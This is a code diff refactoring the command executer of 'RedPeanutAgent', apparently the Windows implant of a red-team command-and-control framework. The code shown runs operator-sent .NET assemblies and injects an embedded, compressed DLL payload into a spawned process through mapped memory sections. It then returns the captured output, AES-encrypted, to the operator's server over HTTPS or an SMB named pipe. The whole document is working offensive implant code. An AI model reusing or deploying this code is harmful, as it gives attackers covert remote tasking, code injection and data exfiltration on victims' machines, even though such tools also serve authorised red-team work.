@@ -4,31 +4,27 @@
 // License: BSD 3-Clause
 //
 
-using RedPeanutAgent.Core;
 using System;
 using System.Diagnostics;
 using System.IO;
 using System.IO.Pipes;
 using System.Net;
 using System.Runtime.InteropServices;
-using System.Security.AccessControl;
 using System.Text;
-using System.Threading;
-using System.Web.Script.Serialization;
 
 namespace RedPeanutAgent.Execution
 {
     class CommandExecuter
     {
-        Utility.TaskMsg task;
+        Core.Utility.TaskMsg task;
         NamedPipeClientStream pipe;
-        Utility.CookiedWebClient wc;
+        Core.Utility.CookiedWebClient wc;
         byte[] aeskey;
         byte[] aesiv;
         string agentid;
         string processname;
 
-        public CommandExecuter(Utility.TaskMsg task, NamedPipeClientStream pipe, Utility.CookiedWebClient wc, byte[] aeskey, byte[] aesiv, string agentid, string processname)
+        public CommandExecuter(Core.Utility.TaskMsg task, NamedPipeClientStream pipe, Core.Utility.CookiedWebClient wc, byte[] aeskey, byte[] aesiv, string agentid, string processname)
         {
             this.task = task;
             this.pipe = pipe;
@@ -49,11 +45,11 @@ namespace RedPeanutAgent.Execution
             string rpaddress = String.Format("https://{0}:{1}/{2}", Program.host, Program.port, Program.pagepost[new Random().Next(Program.pagepost.Length)]);
             if (pipe != null)
             {
-                Utility.SendOutputSMB(output, aeskey, aesiv, pipe);
+                RedPeanutAgent.Core.Utility.SendOutputSMB(output, aeskey, aesiv, pipe);
             }
             else
             {
-                Utility.SendOutputHttp(task.Instanceid, output, wc, aeskey, aesiv, rpaddress, Program.param, agentid);
+                RedPeanutAgent.Core.Utility.SendOutputHttp(task.Instanceid, output, wc, aeskey, aesiv, rpaddress, Program.param, agentid);
             }
         }
 
@@ -87,7 +83,7 @@ namespace RedPeanutAgent.Execution
             SendResponse(output);
         }
 
-        public void ExecuteLocal()
+        public void ExecuteModuleManaged()
         {
             string output = "";
             try
@@ -98,21 +94,34 @@ namespace RedPeanutAgent.Execution
                 Console.SetOut(sw);
                 Console.SetError(sw);
 
-                if (task.TaskType.Equals("standard"))
+                string classname;
+                string assembly;
+                string method;
+                string[] paramsv;
+
+                switch (task.TaskType)
                 {
-                    string classname = task.StandardTask.Moduleclass;
-                    string assembly = task.StandardTask.Assembly;
-                    string method = task.StandardTask.Method;
-                    string[] paramsv = task.StandardTask.Parameters;
-                    Utility.RunAssembly(assembly, classname, method, new object[] { paramsv });
-                }
-                else
-                {
-                    string classname = task.DownloadTask.Moduleclass;
-                    string assembly = task.DownloadTask.Assembly;
-                    string method = task.DownloadTask.Method;
-                    string[] paramsv = task.DownloadTask.Parameters;
-                    Utility.RunAssembly(assembly, classname, method, new object[] { paramsv });
+                    case "standard":
+                        classname = task.StandardTask.Moduleclass;
+                        assembly = task.StandardTask.Assembly;
+                        method = task.StandardTask.Method;
+                        paramsv = task.StandardTask.Parameters;
+                        RedPeanutAgent.Core.Utility.RunAssembly(assembly, classname, method, new object[] { paramsv });
+                        break;
+                    case "download":
+                        classname = task.DownloadTask.Moduleclass;
+                        assembly = task.DownloadTask.Assembly;
+                        method = task.DownloadTask.Method;
+                        paramsv = task.DownloadTask.Parameters;
+                        RedPeanutAgent.Core.Utility.RunAssembly(assembly, classname, method, new object[] { paramsv });
+                        break;
+                    case "module":
+                        classname = task.ModuleTask.Moduleclass;
+                        assembly = task.ModuleTask.Assembly;
+                        method = task.ModuleTask.Method;
+                        paramsv = task.ModuleTask.Parameters;
+                        RedPeanutAgent.Core.Utility.RunAssembly(assembly, classname, method, new object[] { paramsv });
+                        break;
                 }
 
                 output = myb.ToString();
@@ -145,7 +154,7 @@ namespace RedPeanutAgent.Execution
             SendResponse(output);
         }
 
-        public void ExecuteModule()
+        public void ExecuteModuleUnManaged()
         {
 
             string output = "";
@@ -157,7 +166,7 @@ namespace RedPeanutAgent.Execution
                 return;
             }
 
-            Natives.PROCESS_INFORMATION procInfo = new Natives.PROCESS_INFORMATION();
+            Core.Natives.PROCESS_INFORMATION procInfo = new Core.Natives.PROCESS_INFORMATION();
             if (!Spawner.CreateProcess(hReadPipe, hWritePipe, this.processname, true, ref procInfo))
             {
                 return;
@@ -166,7 +175,7 @@ namespace RedPeanutAgent.Execution
             string pipename = GetPipeName(procInfo.dwProcessId);
             InjectionLoaderListener injectionLoaderListener = new InjectionLoaderListener(pipename, task);
 
-            byte[] payload = Utility.DecompressDLL(Convert.FromBase64String(Program.nutclr));
+            byte[] payload = Core.Utility.DecompressDLL(Convert.FromBase64String(Program.nutclr));
 
             //Round payload size to page size
             uint size = InjectionHelper.GetSectionSize(payload.Length);
@@ -182,7 +191,7 @@ namespace RedPeanutAgent.Execution
             //Map section to current process
             IntPtr baseAddr = IntPtr.Zero;
             IntPtr viewSize = (IntPtr)size;
-            InjectionHelper.MapViewOfSection(section, Natives.GetCurrentProcess(), ref baseAddr, ref viewSize);
+            InjectionHelper.MapViewOfSection(section, Core.Natives.GetCurrentProcess(), ref baseAddr, ref viewSize);
             if (baseAddr == IntPtr.Zero)
             {
                 return;
@@ -221,8 +230,8 @@ namespace RedPeanutAgent.Execution
 
             output = injectionLoaderListener.Execute(procInfo.hProcess, hReadPipe);
 
-            Natives.CloseHandle(procInfo.hThread);
-            Natives.CloseHandle(procInfo.hProcess);
+            Core.Natives.CloseHandle(procInfo.hThread);
+            Core.Natives.CloseHandle(procInfo.hProcess);
 
             SendResponse(output);
         }
@@ -234,6 +243,6 @@ namespace RedPeanutAgent.Execution
             return pipename;
 
         }
-        
+
     }
 }
